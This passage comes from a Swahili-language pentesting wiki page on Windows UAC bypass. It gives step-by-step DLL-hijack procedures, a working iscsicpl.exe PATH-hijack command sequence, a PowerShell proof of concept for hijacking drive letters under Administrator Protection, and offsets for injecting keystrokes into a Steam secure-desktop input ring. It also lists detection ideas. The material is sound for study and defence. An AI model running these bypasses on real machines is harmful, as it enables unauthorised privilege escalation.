Ikiwa kelele haijalishi, tool kama [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) inaweza kuomba ruhusa za juu mara kwa mara hadi mtumiaji azikubali.

### Bypass yako mwenyewe - Mbinu ya msingi ya UAC bypass

Ukiangalia **UACME**, utaona kuwa **udukuzi mwingi wa UAC hutumia DLL hijacking** (mara nyingi kwa kufanya binary yenye ruhusa za juu ipakie DLL inayodhibitiwa na mshambuliaji kutoka kwenye path inayoweza kuandikiwa). [Read this to learn how to find a DLL hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Tafuta binary inayoweza **autoelevate** (hakikisha kwamba inapoendeshwa, inaendesha katika kiwango cha high integrity).
2. Tumia procmon kutafuta matukio ya "**NAME NOT FOUND**" ambayo yanaweza kuwa hatarishi kwa **DLL Hijacking**.
3. Huenda ukahitaji **kuandika** DLL ndani ya **protected paths** fulani (kama C:\Windows\System32) ambako huna ruhusa za kuandika. Unaweza kukwepa hili kwa kutumia:
   1. **wusa.exe**: Windows 7, 8 na 8.1. Inaruhusu kutoa maudhui ya faili ya CAB ndani ya protected paths (kwa sababu tool hii inaendeshwa katika kiwango cha high integrity).
   2. **IFileOperation**: Windows 10.
4. Andaa **script** ya kunakili DLL yako ndani ya protected path na kuendesha binary iliyo hatarini na inayoweza kujipandisha yenyewe ruhusa.

### Mbinu nyingine ya UAC bypass

Hii inahusisha kuangalia kama **autoElevated binary** inajaribu **kusoma** kutoka kwenye **registry** **jina/path** ya **binary** au **command** itakayo **endeshwa** (hili linavutia zaidi ikiwa binary inatafuta taarifa hiyo ndani ya **HKCU**).

### UAC bypass kupitia `SysWOW64\iscsicpl.exe` + DLL hijack kwa user `PATH`

`C:\Windows\SysWOW64\iscsicpl.exe` ya biti 32 ni binary ya **auto-elevated** inayoweza kutumiwa kupakia `iscsiexe.dll` kwa kutumia mpangilio wa utafutaji. Ukiweza kuweka `iscsiexe.dll` hasidi ndani ya folda **inayoweza kuandikwa na mtumiaji**, kisha kurekebisha `PATH` ya mtumiaji wa sasa (kwa mfano kupitia `HKCU\Environment\Path`) ili folda hiyo itafutwe, Windows inaweza kupakia DLL ya mshambuliaji ndani ya process ya `iscsicpl.exe` yenye ruhusa za juu **bila kuonyesha kidokezo cha UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Vidokezo vya vitendo:
- Hii ni muhimu wakati mtumiaji wa sasa yuko kwenye **Administrators** lakini anaendesha kwenye **Medium Integrity** kwa sababu ya UAC.
- Nakala ya **SysWOW64** ndiyo inayohusika na bypass hii. Ichukulie nakala ya **System32** kama binary tofauti na uthibitishe tabia yake kivyake.
- Mbinu hii inachanganya **auto-elevation** na **DLL search-order hijacking**, kwa hiyo workflow ileile ya ProcMon inayotumika kwa udukuzi mwingine wa UAC inaweza kusaidia kuthibitisha jaribio la kupakia DLL iliyokosekana.

Mtiririko wa chini kabisa:

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

Mawazo ya kugundua:
- Toa tahadhari `reg add` / uandishi wa sajili kwenye `HKCU\Environment\Path` ukifuatiwa mara moja na utekelezaji wa `C:\Windows\SysWOW64\iscsicpl.exe`.
- Tafuta `iscsiexe.dll` katika maeneo **yanayodhibitiwa na mtumiaji** kama `%TEMP%` au `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Linganisha uzinduzi wa `iscsicpl.exe` na michakato mtoto isiyotarajiwa au upakiaji wa DLL kutoka nje ya saraka za kawaida za Windows.

### Utafiti mpya zaidi unaofaa kuchunguzwa kando

Baadhi ya chain za baada ya 2024 hazifanani tena na utekaji wa kawaida wa sajili ya `HKCU\Software\Classes`. Kwa mfano, activation-context cache poisoning inaweza kuunganisha **drive remap** na **DLL redirection** ili kupata uadilifu wa juu kutoka uadilifu wa kati kupitia UI inayoaminika / binaries zinazoinuliwa kiotomatiki kama `ctfmon.exe` na malengo ya baadaye kama `fodhelper.exe`. Badala ya kurudia PoC kubwa hapa, angalia mifano fupi ya payload katika:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Utekaji wa herufi ya kiendeshi wa Administrator Protection (preview) kupitia ramani ya kifaa cha DOS ya kila kipindi cha kuingia

> [!NOTE]
> Kufikia Agosti 2026, Microsoft bado inaandika Administrator Protection kama **Insider preview**: uzinduzi wa Oktoba 2025 ulifutwa na umepangwa kufanyika baadaye. Thibitisha kuwa **Admin Approval Mode with Administrator protection** imewashwa kweli na kwamba kifaa kimewashwa upya kabla ya kujaribu chain hizi; mfuatano wa toleo la kawaida la 25H2 pekee hauthibitishi kuwa kipengele hiki kinafanya kazi.<sup>[[10]](#references)</sup>

Kwa maelezo kamili ya eneo la mashambulizi la `RAiLaunchAdminProcess` / UIAccess kwenye matoleo ya majaribio ya Windows 11 25H2, angalia ukurasa maalum:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection” hutumia tokeni za shadow-admin zenye ramani za `\Sessions\0\DosDevices/<LUID>` za kila kipindi. Saraka hii huundwa kwa wakati wa matumizi ya kwanza na `SeGetTokenDeviceMap` wakati wa utatuzi wa kwanza wa `\??`. Mshambulizi akiiga tokeni ya shadow-admin katika kiwango cha **SecurityIdentification** pekee, saraka huundwa huku mshambulizi akiwa **mmiliki** (hurithi `CREATOR OWNER`), na hivyo kuruhusu viungo vya herufi za viendeshi vinavyotangulia `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Hatua:**

1. Kutoka kwenye kipindi chenye ruhusa za chini, ita `RAiProcessRunOnce` ili kuzindua `runonce.exe` ya shadow-admin bila kuonyesha prompt.
2. Nakili tokeni yake ya msingi kuwa tokeni ya **identification** na uige wakati wa kufungua `\??` ili kulazimisha kuundwa kwa `\Sessions\0\DosDevices/<LUID>` chini ya umiliki wa mshambuliaji.
3. Unda symlink ya `C:` hapo inayoelekeza kwenye hifadhi inayodhibitiwa na mshambuliaji; ufikiaji unaofuata wa mfumo wa faili katika kipindi hicho hutatua `C:` kuwa njia ya mshambuliaji, na kuwezesha DLL/file hijack bila prompt.

**PoC ya PowerShell (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

Kwenye host za preview, Administrator Protection hurekodi idhini na hitilafu kama matukio ya ETW **15031** na **15032** chini ya provider ya `Microsoft-Windows-LUA`. Matukio hayo yanajumuisha SID ya mwombaji, njia ya programu, matokeo, akaunti ya msimamizi inayosimamiwa, na mbinu ya uthibitishaji, kwa hivyo majaribio ya mara kwa mara ya kutumia exploit au kushindwa kuendesha UI hayakosi telemetry.<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



### Input ya secure-desktop inayopitishwa kupitia ring ya shared-memory inayoweza kuandikwa

Helper ya secure-desktop inaweza kudhoofisha kidokezo cha UAC ikiwa mtumiaji wa medium-integrity anaweza kuandika kwenye input IPC yake. Katika muundo wa Steam ulioripotiwa, `IClientSecureDesktop::BStartStreaming` huanzisha `secure_desktop_capture.exe` kama SYSTEM kwenye `winsta0\winlogon`. Hufichua `Global\SecureDesktopInput_mem-IPCWrapper` ikiwa na ufikiaji wa `GENERIC_ALL` kwa user; helper hutumia maingizo ya ring na kuita `SendInput` kwenye secure desktop. Hii ni tofauti na UIAccess au kubadilisha `PromptOnSecureDesktop`: input hupitishwa na process ambayo tayari inaendeshwa hapo. Tazama [bootstrap ya service IPC](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#shared-memory-bootstrap-into-privileged-service-ipc) kwa maelezo ya jinsi client inavyofikia handler hii. <sup>[[15]](#references)[[16]](#references)</sup>

Ring ina nafasi 128 za baiti 173. Counters zake za kuandika na kusoma ziko kwenye `0x414` na `0x418`, huku nafasi `N` ikiwa kwenye `0x41c + 173*N`. Weka baiti ya kwanza ya nafasi hiyo kuwa `0` kwa plaintext, nakili `INPUT` ya Windows ya baiti 40 mara tu baada yake, kisha ongeza counter ya kuandika. Kwa msimamizi wa medium-integrity anayekabiliwa na kidokezo cha consent, kubonyeza `Y` kwenye keyboard chini kisha juu kunaweza kuwasha control ya UAC ya kukubali baada ya kuzindua executable inayoomba elevation; hakuwezi kujibu kidokezo cha credentials cha standard-user. **Kizuizi cha consent bado ni muhimu**: helper hupitisha input tu baada ya mtumiaji kuidhinisha kidokezo chake cha `InputEnabled` kwa kipindi cha sasa cha idhini cha siku 90. Mapping inayoweza kusomwa/kuandikwa peke yake haithibitishi kuwa input inafika kwenye kidokezo; linganisha counter ya kusoma kabla na baada ya jaribio lililodhibitiwa. <sup>[[15]](#references)[[16]](#references)</sup>

## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Jinsi User Account Control inavyofanya kazi](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Mkusanyiko wa mbinu za kukwepa UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Kichanganuzi cha uoanifu na kizindua cha kukwepa UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI Inatumia AI Kuzalisha PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operesheni TrueChaos: Unyonyaji wa 0-Day Dhidi ya Malengo ya Serikali za Kusini-Mashariki mwa Asia](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Kukwepa Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Kukwepa UAC kwa Kutumia Kazi ya SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Njia za kukwepa UnifiedConsent, TabTip na Narrator Always Notify](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Ulinzi wa msimamizi](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Kuita Seva za Local Windows RPC kutoka .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte Inaongeza Signed Windows Kernel Rootkit kwenye CoolClient](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT: Trojan ya Windows Isiyotambulika Kabisa Iliyoundwa kwa Upelelezi, Wizi na Vitisho](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
- [15] [Atredis – Kugeuza Valve](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [16] [Atredis – PoC za Kugeuza Valve](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
